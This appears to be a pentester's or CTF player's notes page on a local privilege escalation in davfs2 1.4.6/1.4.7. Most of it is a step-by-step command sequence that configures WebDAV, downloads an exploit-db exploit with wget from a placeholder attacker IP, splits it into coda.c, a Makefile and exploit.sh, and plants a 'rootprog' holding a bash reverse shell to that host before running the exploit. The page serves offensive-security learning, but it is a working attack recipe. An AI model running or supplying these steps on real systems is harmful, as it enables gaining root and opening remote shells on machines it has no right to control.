---
description: davfs2 1.4.6/1.4.7 - Local Privilege Escalation
---

# davfs2

[https://www.exploit-db.com/exploits/28806\
https://github.com/sectalks/sectalks/blob/master/ctf-solutions/SYD0x0b/z00nx/README.md](https://www.exploit-db.com/exploits/28806https://github.com/sectalks/sectalks/blob/master/ctf-solutions/SYD0x0b/z00nx/README.md)

```
<1.4.6/etc$ cat /etc/apache2/sites-enabled/000-default                       
NameVirtualHost *:80
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www/test/web/
        <Directory /var/www/test/web/>
                Options Indexes MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        Alias /webdav /var/www/test/web

        <Location /webdav>
           DAV On
           AuthType Basic
           AuthName "webdav"
           AuthUserFile /var/www/test/passwd.dav
           Require valid-user
       </Location>


htdigest /var/www/test/passwd.dav webdav test
password:pass

locate depmod
/sbin/depmod
export PATH=/sbin:$PATH

cd ~

wget http://{LOCAL_IP}/28806.temp.txt
tr -d '\r' < 28806.temp.txt > 28806.txt
sed -n '40,73p' 28806.txt > coda.c
sed -n '84,90p' 28806.txt > Makefile
sed -n '101,192p' 28806.txt > exploit.sh
echo '#!/usr/bin/env bash' > /home/{user}/rootprog
echo 'bash -i >& /dev/tcp/{LOCAL_IP}/{LOCAL_PORT} 0>&1' >> /home/{user}/rootprog
chmod +x /home/user/rootprog
chmod +x exploit.sh
echo 'kernel_fs       coda' >> .davfs2/davfs2.conf
./exploit.sh

mount /home/user/dav/
test
pass
```
